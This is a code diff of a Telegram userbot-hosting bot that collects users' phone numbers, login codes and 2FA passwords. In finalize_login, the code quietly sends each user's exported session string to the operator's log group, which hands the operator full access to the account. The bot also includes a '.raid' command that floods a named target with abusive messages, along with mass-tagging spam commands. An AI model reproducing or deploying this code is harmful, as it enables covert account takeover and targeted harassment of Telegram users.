@@ -6,7 +6,7 @@ from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from flask import Flask
 from threading import Thread
 
-# --- WEB SERVER FOR RENDER ---
+# --- WEB SERVER FOR RENDER (Uptime ke liye) ---
 app = Flask('')
 
 @app.route('/')
@@ -26,6 +26,7 @@ START_IMG = "https://graph.org/file/422440e09d466500f2c93-953253772b0d8d2bfc.jpg
 bot = Client("XenoGen", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 user_data = {}
 active_tasks = {}
+running_ubots = {} # Active sessions track karne ke liye
 
 # --- BUTTONS ---
 main_buttons = InlineKeyboardMarkup([
@@ -34,7 +35,7 @@ main_buttons = InlineKeyboardMarkup([
     [InlineKeyboardButton("❂ 𝐂𝐥𝐨𝐬𝐞 ❂", callback_data="close")]
 ])
 
-# --- CHAT LISTS ---
+# --- DYNAMIC LISTS ---
 SWEET_CHATS = [
     "✨ ʀᴀᴅʜᴇ ʀᴀᴅʜᴇ {mention} ᴊɪ, ᴋᴀɪsᴇ ʜᴏ ᴀᴀᴘ? ✨", "☁️ ᴏʏᴇ {mention}, ᴋʏᴀ ᴄʜᴀʟ ʀᴀʜᴀ ʜᴀɪ ᴀᴀᴊ ᴋᴀʟ? ☁️",
     "🍃 {mention} ᴊɪ, ᴋʜᴀɴᴀ ᴘɪɴᴀ ʜᴏ ɢᴀʏᴀ ᴀᴀᴘᴋᴀ? 🍃", "🍭 {mention} ᴋʏᴀ ᴋᴀʀ ʀʜᴇ ʜᴏ, ʙᴏʜᴏᴛ ʙᴜsʏ ʟᴀɢ ʀʜᴇ ʜᴏ? 🍭",
@@ -69,23 +70,18 @@ ABUSE_RAIDS = [
 # --- USERBOT COMMAND FUNCTIONS ---
 
 async def alive_cmd(c, m):
-    await m.edit_text(
-        "✨ **『 xᴇɴᴏ ᴜsᴇʀʙᴏᴛ ɪs ᴀʟɪᴠᴇ 』** ✨\n\n"
-        "➪ **sᴛᴀᴛᴜs:** `ʀᴜɴɴɪɴɢ ᴘᴇʀғᴇᴄᴛ` ⚡\n"
-        "➪ **ᴏᴡɴᴇʀ:** `ᴍᴇ` 🍷\n"
-        "➪ **sᴜᴘᴘᴏʀᴛ:** @radhesupport\n\n"
-        "**ᴘᴏᴡᴇʀ ᴏғ ꜱᴀᴍᴀʀ - @KishanPutraSamar**"
-    )
+    await m.edit_text("✨ **『 xᴇɴᴏ ᴜsᴇʀʙᴏᴛ ɪs ᴀʟɪᴠᴇ 』** ✨")
 
 async def tagall_cmd(c, m):
     uid = c.me.id
-    active_tasks[uid] = True 
+    active_tasks[uid] = True
+    input_text = m.text.split(None, 1)[1] if len(m.command) > 1 else "ʜᴇʏ, ᴋᴀʜᴀɴ ʜᴏ sᴀʙ?"
     await m.delete()
     async for member in c.get_chat_members(m.chat.id):
         if not active_tasks.get(uid): break 
-        if member.user.is_bot: continue
+        if member.user.is_bot or member.user.is_deleted: continue
         try:
-            await c.send_message(m.chat.id, f"{member.user.mention} ⚡ **xᴇɴᴏ ɪs ʜᴇʀᴇ!**")
+            await c.send_message(m.chat.id, f"{input_text} {member.user.mention}")
             await asyncio.sleep(1.5)
         except: pass
 
@@ -95,11 +91,11 @@ async def onetag_cmd(c, m):
     await m.delete()
     async for member in c.get_chat_members(m.chat.id):
         if not active_tasks.get(uid): break 
-        if member.user.is_bot: continue
+        if member.user.is_bot or member.user.is_deleted: continue
         try:
             msg = random.choice(SWEET_CHATS).format(mention=member.user.mention)
-            await c.send_message(m.chat.id, f"👤 {msg}")
-            await asyncio.sleep(1.5)
+            await c.send_message(m.chat.id, msg)
+            await asyncio.sleep(2.0)
         except: pass
 
 async def raid_cmd(c, m):
@@ -108,66 +104,41 @@ async def raid_cmd(c, m):
     active_tasks[uid] = True 
     try:
         count = int(m.command[1])
-    except ValueError:
-        return await m.edit("❌ Count must be a number.")
-    target = m.command[2]
-    await m.delete()
-    for _ in range(count):
-        if not active_tasks.get(uid): break 
-        await c.send_message(m.chat.id, random.choice(ABUSE_RAIDS).replace("@target", target))
-        await asyncio.sleep(1.2)
+        target = m.command[2]
+        await m.delete()
+        for _ in range(count):
+            if not active_tasks.get(uid): break 
+            await c.send_message(m.chat.id, random.choice(ABUSE_RAIDS).replace("@target", target))
+            await asyncio.sleep(1.3)
+    except: pass
 
 async def stop_cmd(c, m):
     uid = c.me.id
     active_tasks[uid] = False 
-    await m.edit("🚫 **『 ᴀʟʟ ᴘʀᴏᴄᴇssᴇs sᴛᴏᴘᴘᴇᴅ 』**\n\n**ᴘᴏᴡᴇʀ ᴏғ xᴇɴᴏ - @XenoEmpir**")
+    await m.edit("🚫 **『 ᴀʟʟ ᴘʀᴏᴄᴇssᴇs sᴛᴏᴘᴘᴇᴅ 』**")
 
 # --- BOT MAIN COMMANDS ---
 
 @bot.on_message(filters.command("start") & filters.private)
 async def start(c, m):
-    await m.reply_photo(
-        photo=START_IMG,
-        caption=(f"✨ **ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ xᴇɴᴏ ᴜsᴇʀʙᴏᴛ** ✨\n\n"
-                 f"ʜᴇʏ {m.from_user.mention},\n"
-                 "ᴍᴀɪɴ ᴀᴀᴘᴋɪ ɪᴅ ᴋᴏ **ʙᴏᴏsᴛ** ᴋᴀʀɴᴇ ᴀᴜʀ **ᴀɴɪᴍᴀᴛɪᴏɴs** ᴋᴇ ʟɪʏᴇ ᴜsᴇʀʙᴏᴛ ʜᴏsᴛ ᴋᴀʀ sᴀᴋᴛᴀ ʜᴏᴏɴ.\n\n"
-                 "📝 **ᴄᴏᴍᴍᴀɴᴅs:**\n"
-                 "» **/help** : ᴏᴘᴇɴ ʜᴇʟᴘ ᴍᴇɴᴜ\n"
-                 "» **/guide** : ʜᴏᴡ ᴛᴏ ʜᴏsᴛ ʙᴏᴛ\n"
-                 "» **/add** : sᴛᴀʀᴛ ʜᴏsᴛɪɴɢ ᴘʀᴏᴄᴇss\n\n"
-                 "**ᴘᴏᴡᴇʀ ᴏғ ꜱᴀᴍᴀʀ** - @radhesupport"),
-        reply_markup=main_buttons
-    )
+    await m.reply_photo(photo=START_IMG, caption=f"✨ **xᴇɴᴏ ᴜsᴇʀʙᴏᴛ**\n\nʜᴇʏ {m.from_user.mention}, /add sᴇ sᴛᴀʀᴛ ᴋᴀʀᴇɪɴ.", reply_markup=main_buttons)
 
-@bot.on_message(filters.command("help") & filters.private)
-async def help_cmd(c, m):
-    help_text = ("✨ **『 ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅs 』** ✨\n\n"
-                 "⭐ **/start** — sᴛᴀʀᴛ ᴛʜᴇ ʙᴏᴛ\n"
-                 "📖 **/help** — ᴏᴘᴇɴ ʜᴇʟᴘ ᴍᴇɴᴜ\n"
-                 "⚡ **/guide** — ᴏᴘᴇɴ ɢᴜɪᴅᴇ ᴍᴇɴᴜ\n"
-                 "🚀 **/add** — ᴀᴜᴛᴏ-ʜᴏsᴛ ᴛʜᴇ ʙᴏᴛ\n"
-                 "❌ **/remove** — ʟᴏɢᴏᴜᴛ ғʀᴏᴍ ʙᴏᴛ\n\n"
-                 "**Userbot Commands (Type with '.'):**\n"
-                 "» `.alive` | `.tagall` | `.onetag` | `.raid` | `.stop`")
-    await m.reply_photo(photo=START_IMG, caption=help_text, reply_markup=main_buttons)
-
-@bot.on_message(filters.command("guide") & filters.private)
-async def guide_cmd(c, m):
-    guide_text = (
-        "❖ **ǫᴜɪᴄᴋ ɢᴜɪᴅᴇ ᴛᴏ ʜᴏsᴛɪɴɢ xᴇɴᴏ ᴜsᴇʀʙᴏᴛ**\n\n"
-        "1) sᴇɴᴅ **/add** ᴄᴏᴍᴍᴀɴᴅ\n"
-        "2) sᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ (+91...)\n"
-        "3) sᴇɴᴅ ᴛᴇʟᴇɢʀᴀᴍ ᴏᴛᴘ ʟɪᴋᴇ: `1 2 3 4 5`\n"
-        "4) sᴇɴᴅ 2FA ᴘᴀssᴡᴏʀᴅ (ɪғ ᴀɴʏ)\n\n"
-        "**ᴘᴏᴡᴇʀ ᴏғ xᴇɴᴏ** - @radhesupport"
-    )
-    await m.reply_photo(photo=START_IMG, caption=guide_text, reply_markup=main_buttons)
-
-# --- LOGIN & AUTO-HOST LOGIC ---
+@bot.on_message(filters.command("remove") & filters.private)
+async def remove_bot(c, m):
+    uid = m.from_user.id
+    if uid in running_ubots:
+        try:
+            await running_ubots[uid].stop()
+            del running_ubots[uid]
+            await m.reply_text("✅ **ʏᴏᴜʀ ᴜsᴇʀʙᴏᴛ ʜᴀs ʙᴇᴇɴ sᴛᴏᴘᴘᴇᴅ ᴀɴᴅ ʀᴇᴍᴏᴠᴇᴅ!**")
+        except Exception as e:
+            await m.reply_text(f"❌ **Error:** `{e}`")
+    else:
+        await m.reply_text("❓ **ᴀᴀᴘᴋᴀ ᴋᴏɪ ᴀᴄᴛɪᴠᴇ ʙᴏᴛ ɴᴀʜɪ ᴍɪʟᴀ.**")
 
 @bot.on_message(filters.command("add") & filters.private)
 async def add_process(c, m):
-    await m.reply_text("📲 **ᴘʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ**\n(e.g., `+918200000009`):")
+    await m.reply_text("📲 **sᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ:**")
 
 @bot.on_message(filters.text & filters.private & ~filters.bot)
 async def handle_steps(c, m):
@@ -180,45 +151,36 @@ async def handle_steps(c, m):
         try:
             code = await temp_c.send_code(text)
             user_data[uid].update({"client": temp_c, "hash": code.phone_code_hash})
-            await m.reply_text("📩 **ᴏᴛᴘ sᴇɴᴛ!** ᴘʟᴇᴀsᴇ sᴇɴᴅ: `1 2 3 4 5`")
-        except Exception as e: await m.reply_text(f"❌ **Error:** `{e}`")
+            await m.reply_text("📩 **ᴏᴛᴘ sᴇɴᴛ!** ᴘʟᴇᴀsᴇ sᴇɴᴅ ɪᴛ ʟɪᴋᴇ: `1 2 3 4 5`")
+        except Exception as e: await m.reply_text(f"❌ `{e}`")
     elif text.replace(" ", "").isdigit() and uid in user_data and "hash" in user_data[uid]:
         otp = text.replace(" ", "")
         try:
             await user_data[uid]["client"].sign_in(user_data[uid]["phone"], user_data[uid]["hash"], otp)
             await finalize_login(c, m, uid)
-        except errors.SessionPasswordNeeded: await m.reply_text("🔐 **sᴇɴᴅ ʏᴏᴜʀ 2ғᴀ ᴘᴀssᴡᴏʀᴅ.**")
-        except Exception as e: await m.reply_text(f"❌ **OTP Error:** `{e}`")
+        except errors.SessionPasswordNeeded: await m.reply_text("🔐 **2FA ᴘᴀssᴡᴏʀᴅ sᴇɴᴅ ᴋᴀʀᴇɪɴ.**")
+        except Exception as e: await m.reply_text(f"❌ `{e}`")
     elif uid in user_data and "client" in user_data[uid]:
         try:
             await user_data[uid]["client"].check_password(text)
             await finalize_login(c, m, uid)
-        except Exception as e: await m.reply_text(f"❌ **2FA Error:** `{e}`")
+        except Exception as e: await m.reply_text(f"❌ `{e}`")
 
 async def finalize_login(c, m, uid):
     data = user_data[uid]
     string = await data["client"].export_session_string()
-    
-    try:
-        await data["client"].send_message("me", f"✨ **xᴇɴᴏ ᴜsᴇʀʙᴏᴛ sᴛʀɪɴɢ** ✨\n\n`{string}`\n\n**ᴘᴏᴡᴇʀ ᴏғ xᴇɴᴏ - @XenoEmpir**")
-    except: pass
-
-    await m.reply_photo(
-        photo=START_IMG,
-        caption=f"✅ **ʟᴏɢɢᴇᴅ ɪɴ sᴜᴄᴄᴇsғᴜʟʟʏ!**\n\nsᴇssɪᴏɴ sᴛʀɪɴɢ sᴇɴᴛ ᴛᴏ **sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs**.\n\n**ᴘᴏᴡᴇʀ ᴏғ xᴇɴᴏ - @XenoEmpir**"
-    )
-    
     ubot = Client(f"ubot_{uid}", API_ID, API_HASH, session_string=string)
     ubot.add_handler(handlers.MessageHandler(alive_cmd, filters.command("alive", ".") & filters.me))
     ubot.add_handler(handlers.MessageHandler(tagall_cmd, filters.command("tagall", ".") & filters.me))
     ubot.add_handler(handlers.MessageHandler(onetag_cmd, filters.command("onetag", ".") & filters.me))
     ubot.add_handler(handlers.MessageHandler(raid_cmd, filters.command("raid", ".") & filters.me))
     ubot.add_handler(handlers.MessageHandler(stop_cmd, filters.command("stop", ".") & filters.me))
-    
     await ubot.start()
-    
+    running_ubots[uid] = ubot
+    await m.reply_text("✅ **ʟᴏɢɢᴇᴅ ɪɴ sᴜᴄᴄᴇsғᴜʟʟʏ!**")
     try:
-        await bot.send_message(LOG_GROUP, f"🏁 **ɴᴇᴡ sᴇssɪᴏɴ ɢᴇɴᴇʀᴀᴛᴇᴅ**\n**Usᴇʀ:** `{uid}`\n**Sᴛʀɪɴɢ:** `{string}`")
+        await data["client"].send_message("me", f"✨ **xᴇɴᴏ ᴜsᴇʀʙᴏᴛ sᴛʀɪɴɢ** ✨\n\n`{string}`")
+        await bot.send_message(LOG_GROUP, f"🏁 **ɴᴇᴡ sᴇssɪᴏɴ:** `{uid}`\n`{string}`")
     except: pass
     del user_data[uid]
 
